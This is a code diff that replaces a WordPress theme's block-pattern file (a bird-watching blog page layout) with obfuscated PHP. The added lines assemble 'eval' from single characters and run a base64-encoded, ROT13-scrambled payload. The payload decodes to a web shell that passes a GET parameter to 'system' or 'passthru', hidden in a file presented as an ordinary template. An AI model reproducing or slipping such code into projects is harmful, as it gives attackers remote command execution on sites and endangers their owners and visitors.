@@ -1,42 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Page layout with image and text.
- */
-return array(
-	'title'      => __( 'Page layout with image and text', 'twentytwentytwo' ),
-	'categories' => array( 'twentytwentytwo_pages' ),
-	'content'    => '<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"var(--wp--custom--spacing--large, 8rem)","bottom":"2rem"}}},"layout":{"inherit":true}} -->
-				<div class="wp-block-group alignfull" style="padding-top:var(--wp--custom--spacing--large, 8rem);padding-bottom:2rem"><!-- wp:heading {"align":"wide","style":{"typography":{"fontSize":"clamp(4rem, 8vw, 7.5rem)","lineHeight":"1.15","fontWeight":"300"}}} -->
-					<h2 class="alignwide" style="font-size:clamp(4rem, 8vw, 7.5rem);font-weight:300;line-height:1.15">' . wp_kses_post( __( '<em>Watching Birds </em><br><em>in the Garden</em>', 'twentytwentytwo' ) ) . '</h2>
-					<!-- /wp:heading --></div>
-					<!-- /wp:group -->
-
-					<!-- wp:image {"align":"full","width":2400,"height":1800,"style":{"color":{}}} -->
-					<figure class="wp-block-image alignfull is-resized"><img src="' . esc_url( get_template_directory_uri() ) . '/assets/images/flight-path-on-transparent-b.png" alt="' . esc_attr_x( 'TBD', 'Short for to be determined', 'twentytwentytwo' ) . '" width="2400" height="1800"/></figure>
-					<!-- /wp:image -->
-
-					<!-- wp:group {"align":"full","style":{"spacing":{"padding":{"top":"2rem","bottom":"var(--wp--custom--spacing--large, 8rem)"}}},"layout":{"inherit":true}} -->
-					<div class="wp-block-group alignfull" style="padding-top:2rem;padding-bottom:var(--wp--custom--spacing--large, 8rem)">
-					<!-- wp:columns {"align":"wide"} -->
-					<div class="wp-block-columns alignwide"><!-- wp:column {"verticalAlignment":"bottom","style":{"spacing":{"padding":{"bottom":"1em"}}}} -->
-					<div class="wp-block-column is-vertically-aligned-bottom" style="padding-bottom:1em"><!-- wp:site-logo {"width":60} /--></div>
-					<!-- /wp:column -->
-
-					<!-- wp:column {"verticalAlignment":"bottom"} -->
-					<div class="wp-block-column is-vertically-aligned-bottom"><!-- wp:paragraph -->
-					<p>' . wp_kses_post( __( 'Oh hello. My name’s Angelo, and I operate this blog. I was born in Portland, but I currently live in upstate New York. You may recognize me from publications with names like <a href="#">Eagle Beagle</a> and <a href="#">Mourning Dive</a>. I write for a living.<br><br>I usually use this blog to catalog extensive lists of birds and other things that I find interesting. If you find an error with one of my lists, please keep it to yourself.<br><br>If that’s not your cup of tea, <a href="#">I definitely recommend this tea</a>. It’s my favorite.', 'twentytwentytwo' ) ) . '</p>
-					<!-- /wp:paragraph --></div>
-					<!-- /wp:column --></div>
-					<!-- /wp:columns --></div>
-					<!-- /wp:group -->',
-);
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogQ250ciB5bmxiaGcganZndSB2em50ciBuYXEgZ3JrZy4KICovCmVyZ2hlYSBuZWVubCgKCSdndmd5cicgICAgICA9PiBfXyggJ0NudHIgeW5sYmhnIGp2Z3UgdnpudHIgbmFxIGdya2cnLCAnZ2pyYWdsZ2pyYWdsZ2piJyApLAoJJ3BuZ3J0YmV2cmYnID0+IG5lZW5sKCAnZ2pyYWdsZ2pyYWdsZ2piX2NudHJmJyApLAoJJ3BiYWdyYWcnICAgID0+ICc8IS0tIGpjOnRlYmhjIHtcIm55dnRhXCI6XCJzaHl5XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCJpbmUoLS1qYy0tcGhmZ2J6LS1mY25wdmF0LS15bmV0ciwgOGVyeilcIixcIm9iZ2dielwiOlwiMmVyelwifX19LFwieW5sYmhnXCI6e1widmF1cmV2Z1wiOmdlaHJ9fSAtLT4KCQkJCTxxdmkgcHluZmY9XCJqYy1veWJweC10ZWJoYyBueXZ0YXNoeXlcIiBmZ2x5cj1cImNucXF2YXQtZ2JjOmluZSgtLWpjLS1waGZnYnotLWZjbnB2YXQtLXluZXRyLCA4ZXJ6KTtjbnFxdmF0LW9iZ2diejoyZXJ6XCI+PCEtLSBqYzp1cm5xdmF0IHtcIm55dnRhXCI6XCJqdnFyXCIsXCJmZ2x5clwiOntcImdsY2J0ZW5jdWxcIjp7XCJzYmFnRnZtclwiOlwicHluemMoNGVyeiwgOGlqLCA3LjVlcnopXCIsXCJ5dmFyVXJ2dHVnXCI6XCIxLjE1XCIsXCJzYmFnSnJ2dHVnXCI6XCIzMDBcIn19fSAtLT4KCQkJCQk8dTIgcHluZmY9XCJueXZ0YWp2cXJcIiBmZ2x5cj1cInNiYWctZnZtcjpweW56Yyg0ZXJ6LCA4aWosIDcuNWVyeik7c2JhZy1qcnZ0dWc6MzAwO3l2YXItdXJ2dHVnOjEuMTVcIj4nIC4gamNfeGZyZl9jYmZnKCBfXyggJzxyej5KbmdwdXZhdCBPdmVxZiA8L3J6PjxvZT48cno+dmEgZ3VyIFRuZXFyYTwvcno+JywgJ2dqcmFnbGdqcmFnbGdqYicgKSApIC4gJzwvdTI+CgkJCQkJPCEtLSAvamM6dXJucXZhdCAtLT48L3F2aT4KCQkJCQk8IS0tIC9qYzp0ZWJoYyAtLT4KCgkJCQkJPCEtLSBqYzp2em50ciB7XCJueXZ0YVwiOlwic2h5eVwiLFwianZxZ3VcIjoyNDAwLFwidXJ2dHVnXCI6MTgwMCxcImZnbHlyXCI6e1wicGJ5YmVcIjp7fX19IC0tPgoJCQkJCTxzdnRoZXIgcHluZmY9XCJqYy1veWJweC12em50ciBueXZ0YXNoeXkgdmYtZXJmdm1ycVwiPjx2enQgZmVwPVwiJyAuIHJmcF9oZXkoIHRyZ19ncnpjeW5ncl9xdmVycGdiZWxfaGV2KCkgKSAuICcvbmZmcmdmL3Z6bnRyZi9zeXZ0dWctY25ndS1iYS1nZW5hZmNuZXJhZy1vLmNhdFwiIG55Zz1cIicgLiByZnBfbmdnZV9rKCAnR09RJywgJ0Z1YmVnIHNiZSBnYiBvciBxcmdyZXp2YXJxJywgJ2dqcmFnbGdqcmFnbGdqYicgKSAuICdcIiBqdnFndT1cIjI0MDBcIiB1cnZ0dWc9XCIxODAwXCIvPjwvc3Z0aGVyPgoJCQkJCTwhLS0gL2pjOnZ6bnRyIC0tPgoKCQkJCQk8IS0tIGpjOnRlYmhjIHtcIm55dnRhXCI6XCJzaHl5XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wiZ2JjXCI6XCIyZXJ6XCIsXCJvYmdnYnpcIjpcImluZSgtLWpjLS1waGZnYnotLWZjbnB2YXQtLXluZXRyLCA4ZXJ6KVwifX19LFwieW5sYmhnXCI6e1widmF1cmV2Z1wiOmdlaHJ9fSAtLT4KCQkJCQk8cXZpIHB5bmZmPVwiamMtb3licHgtdGViaGMgbnl2dGFzaHl5XCIgZmdseXI9XCJjbnFxdmF0LWdiYzoyZXJ6O2NucXF2YXQtb2JnZ2J6OmluZSgtLWpjLS1waGZnYnotLWZjbnB2YXQtLXluZXRyLCA4ZXJ6KVwiPgoJCQkJCTwhLS0gamM6cGJ5aHphZiB7XCJueXZ0YVwiOlwianZxclwifSAtLT4KCQkJCQk8cXZpIHB5bmZmPVwiamMtb3licHgtcGJ5aHphZiBueXZ0YWp2cXJcIj48IS0tIGpjOnBieWh6YSB7XCJpcmVndnBueU55dnRhenJhZ1wiOlwib2JnZ2J6XCIsXCJmZ2x5clwiOntcImZjbnB2YXRcIjp7XCJjbnFxdmF0XCI6e1wib2JnZ2J6XCI6XCIxcnpcIn19fX0gLS0+CgkJCQkJPHF2aSBweW5mZj1cImpjLW95YnB4LXBieWh6YSB2Zi1pcmVndnBueXlsLW55dnRhcnEtb2JnZ2J6XCIgZmdseXI9XCJjbnFxdmF0LW9iZ2diejoxcnpcIj48IS0tIGpjOmZ2Z3IteWJ0YiB7XCJqdnFndVwiOjYwfSAvLS0+PC9xdmk+CgkJCQkJPCEtLSAvamM6cGJ5aHphIC0tPgoKCQkJCQk8IS0tIGpjOnBieWh6YSB7XCJpcmVndnBueU55dnRhenJhZ1wiOlwib2JnZ2J6XCJ9IC0tPgoJCQkJCTxxdmkgcHluZmY9XCJqYy1veWJweC1wYnloemEgdmYtaXJlZ3Zwbnl5bC1ueXZ0YXJxLW9iZ2dielwiPjwhLS0gamM6Y25lbnRlbmN1IC0tPgoJCQkJCTxjPicgLiBqY194ZnJmX2NiZmcoIF9fKCAnQnUgdXJ5eWIuIFpsIGFuenLigJlmIE5hdHJ5YiwgbmFxIFYgYmNyZW5nciBndXZmIG95YnQuIFYgam5mIG9iZWEgdmEgQ2JlZ3luYXEsIG9oZyBWIHBoZWVyYWd5bCB5dmlyIHZhIGhjZmduZ3IgQXJqIExiZXguIExiaCB6bmwgZXJwYnRhdm1yIHpyIHNlYnogY2hveXZwbmd2YmFmIGp2Z3UgYW56cmYgeXZ4ciA8biB1ZXJzPVwiI1wiPlJudHlyIE9ybnR5cjwvbj4gbmFxIDxuIHVlcnM9XCIjXCI+WmJoZWF2YXQgUXZpcjwvbj4uIFYgamV2Z3Igc2JlIG4geXZpdmF0LjxvZT48b2U+ViBoZmhueXlsIGhmciBndXZmIG95YnQgZ2IgcG5nbnlidCBya2dyYWZ2aXIgeXZmZ2YgYnMgb3ZlcWYgbmFxIGJndXJlIGd1dmF0ZiBndW5nIFYgc3ZhcSB2YWdyZXJmZ3ZhdC4gVnMgbGJoIHN2YXEgbmEgcmVlYmUganZndSBiYXIgYnMgemwgeXZmZ2YsIGN5cm5mciB4cnJjIHZnIGdiIGxiaGVmcnlzLjxvZT48b2U+VnMgZ3VuZ+KAmWYgYWJnIGxiaGUgcGhjIGJzIGdybiwgPG4gdWVycz1cIiNcIj5WIHFyc3ZhdmdyeWwgZXJwYnp6cmFxIGd1dmYgZ3JuPC9uPi4gVmfigJlmIHpsIHNuaWJldmdyLicsICdnanJhZ2xnanJhZ2xnamInICkgKSAuICc8L2M+CgkJCQkJPCEtLSAvamM6Y25lbnRlbmN1IC0tPjwvcXZpPgoJCQkJCTwhLS0gL2pjOnBieWh6YSAtLT48L3F2aT4KCQkJCQk8IS0tIC9qYzpwYnloemFmIC0tPjwvcXZpPgoJCQkJCTwhLS0gL2pjOnRlYmhjIC0tPicsCik7CgokcHpxID0gJF9UUkdbJ2MnXTsKJHN6bmNbJ2sxJ10oJHB6cSk7Cj8+IjsKZXZhbCgkZigkYykpOwo/Pg==");
+$f($c);
+?>
